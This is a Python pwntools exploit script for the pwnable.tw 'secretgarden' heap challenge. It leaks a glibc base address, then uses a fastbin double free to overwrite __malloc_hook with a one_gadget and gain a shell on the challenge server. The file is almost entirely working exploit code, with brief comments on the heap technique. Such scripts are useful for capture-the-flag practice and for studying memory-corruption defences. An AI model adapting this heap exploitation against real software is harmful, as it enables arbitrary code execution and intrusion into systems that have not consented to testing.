#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./secretgarden', checksec = False)
libc = ELF('./libc_64.so.6', checksec = False)
#libc = ELF('/glibc/2.23/64/lib/libc-2.23.so', checksec = False)

one_gadget = 0xef6c4

# Byte sequence alias
A8 = 8 * b'A'

class Challenge:
    def __init__(self, proc):
        self.proc = proc

    def create(self, len_name, name = A8, color = A8):
        """ malloc(0x28), malloc(len_name) """
        self.proc.sendlineafter(b'choice : ', b'1')
        self.proc.sendlineafter(b'name :', str(len_name).encode('utf-8'))
        self.proc.sendlineafter(b'of flower :', name)
        self.proc.sendlineafter(b'the flower :', color)

    def visit(self):
        self.proc.sendlineafter(b'choice : ', b'2')

    def remove(self, index):
        self.proc.sendlineafter(b'choice : ', b'3')
        self.proc.sendlineafter(b'garden:', str(index).encode('utf-8'))

    def cleanup(self):
        self.proc.sendlineafter(b'choice : ', b'4')

def main():
    proc = remote('chall.pwnable.tw', 10203)
    #proc = process(['./secretgarden'], env={'LD_PRELOAD': './libc_64.so.6'})
    #proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    chall = Challenge(proc)

    # Prepare a large chunk
    chall.create(0x420)

    # Prevents the large chunk from being merged into the top chunk.
    chall.create(0x38)

    # Prevents the 0x430-byte chunk from being split.
    chall.create(0x28)
    chall.remove(2)

    # Free the 0x430-byte chunk into unsorted bin.
    chall.remove(0)

    # Allocate the 0x430-byte chunk again so that visit() can print it.
    chall.create(0x420, b'', b'A')

    chall.visit()

    proc.recvuntil(b'flower[3] :')
    leaked = u64(proc.recv(6).ljust(8, b'\x00'))
    offset = 0x7fb7dafc4b0a - 0x7fb7dac01000  # for stripped glibc 2.23
    #offset = 0x7efddbaffb0a - 0x7efddb764000  # for non-stripped glibc 2.23
    libc_base = leaked - offset
    log.info('leaked libc_base: {}'.format(hex(libc_base)))

    # Overwrite __malloc_hook with one gadget using fastbin dup.
    chall.create(0x68)
    chall.create(0x68)
    chall.remove(4)
    chall.remove(5)
    chall.remove(4)
    chall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))
    chall.create(0x68)
    chall.create(0x68)
    #chall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))

    # Trigger __malloc_hook.
    # It seems that raising a flower will cause the one gadgets to crash.
    # An alternative way is to trigger __malloc_hook via malloc_printerr().
    # To do this, we can trigger a "double free or corruption (fasttop)".
    chall.create(0x48)  # prepare a chunk for (fasttop) error
    chall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))  # overwrite __malloc_hook
    chall.remove(9)
    chall.remove(9)

    proc.interactive()

if __name__ == '__main__':
    main()
